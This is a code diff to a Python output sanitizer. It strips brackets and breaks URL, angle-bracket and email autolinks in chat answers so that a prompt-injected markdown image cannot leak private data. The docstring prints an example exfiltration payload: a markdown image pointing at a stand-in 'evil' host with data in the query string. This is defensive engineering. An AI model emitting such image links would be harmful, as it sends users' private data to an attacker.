@@ -3,7 +3,8 @@
 Used where the prompt mixes private data with untrusted web text: a prompt-injected image
 (`![x](//evil/?d=...)`, or the reference form `![x][r]` + `[r]: ...`) would make the browser send that
 data out. Rather than blocklisting markdown syntax, the characters links and images need are removed:
-square brackets go, and `://` / `www.` are broken so nothing autolinks. Raw HTML needs no handling
+square brackets go, `://` / `www.` are broken, a space follows any `<` before a letter (no
+`<http:...>` / `<mailto:...>` autolinks) and any `@` inside a word (no email autolinks). Raw HTML needs no handling
 because the chat renderer doesn't render it. Every rule is a fixed-width text rewrite, so streaming
 only holds back the last few characters in case a pattern spans two chunks.
 """
@@ -11,6 +12,8 @@ only holds back the last few characters in case a pattern spans two chunks.
 import re
 
 _WWW = re.compile(r"www\.", re.IGNORECASE)
+_ANGLE_AUTOLINK = re.compile(r"<(?=[A-Za-z])")
+_EMAIL_AT = re.compile(r"(?<=\w)@(?=\w)")
 # Longest pattern ("www.") minus one: enough tail to finish a pattern split across chunks.
 HOLD = 3
 
@@ -19,7 +22,9 @@ def sanitize(text: str) -> str:
     """Idempotent: sanitizing already-sanitized text changes nothing."""
     text = text.replace("[", "").replace("]", "")
     text = text.replace("://", ": ")
-    return _WWW.sub("www ", text)
+    text = _WWW.sub("www ", text)
+    text = _ANGLE_AUTOLINK.sub("< ", text)
+    return _EMAIL_AT.sub("@ ", text)
 
 
 class AnswerSanitizer:
